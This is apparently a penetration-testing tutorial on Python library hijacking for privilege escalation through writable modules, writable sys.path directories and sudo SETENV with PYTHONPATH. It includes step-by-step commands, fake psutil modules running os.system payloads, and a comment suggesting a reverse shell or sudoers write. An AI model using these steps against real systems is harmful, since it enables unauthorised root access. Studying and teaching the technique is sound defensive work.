## Python Library Hijacking

Python resolves imports by searching directories in a specific order. If any of those directories — or the modules inside them — are misconfigured, it's possible to inject malicious code that runs in place of the legitimate library. There are three main vectors:

1. **Wrong write permissions** — a writable module file
2. **Library path abuse** — a writable higher-priority directory in `sys.path`
3. **PYTHONPATH variable** — user can set the search path before execution

---

### 1. Wrong write permissions

If a SUID/SGID Python script imports a module whose source file is world-writable, injecting code into that module is enough — it will run with the script's elevated privileges.

Locate the function being called inside the module:

```shell
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

Check if the file is writable:

```shell
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

If writable, prepend a payload at the top of the target function:

```python
def virtual_memory():
    import os
    os.system('id')   # payload — replace with reverse shell or sudoers write
    ...
```

> 💡 This misconfiguration is most common in shared developer environments where permissions are loosened for convenience.

---

### 2. Library path abuse

Python searches directories in the order listed in `sys.path`. If a higher-priority directory is writable, we can place a fake module there that Python will load before the legitimate one.

#### Check the search order

```shell
python3 -c 'import sys; print("\n".join(sys.path))'
```

#### Find where the real module is installed

```shell
pip3 show psutil
```

#### Check for writable directories above it

```shell
ls -la /usr/lib/python3.8
```

If a writable directory ranks higher in `sys.path` than the real module's location, create a fake module there with the same name:

```python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')   # payload
```

Save it as `psutil.py` in the writable directory. The next time the script runs with elevated privileges, Python loads ours first.

---

### 3. PYTHONPATH environment variable

`PYTHONPATH` explicitly tells Python where to search for modules before checking `sys.path`. If `sudo -l` shows `SETENV` alongside a Python binary, we can override the search path entirely at runtime.

```shell
sudo -l
```

Relevant output:

```
(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

`SETENV` means we can pass environment variables to the sudo execution — including `PYTHONPATH`.

#### Prepare the malicious module

```shell
cat > /tmp/psutil.py << 'EOF'
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')   # payload
    return None
EOF
```

#### Execute with the overridden path

```shell
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

Python now resolves `psutil` to `/tmp/psutil.py` before checking any system path.

---

> 💡 If none of the above work, check whether the script resolves imports from the **current working directory** first — dropping a fake module there under the same name may be enough.
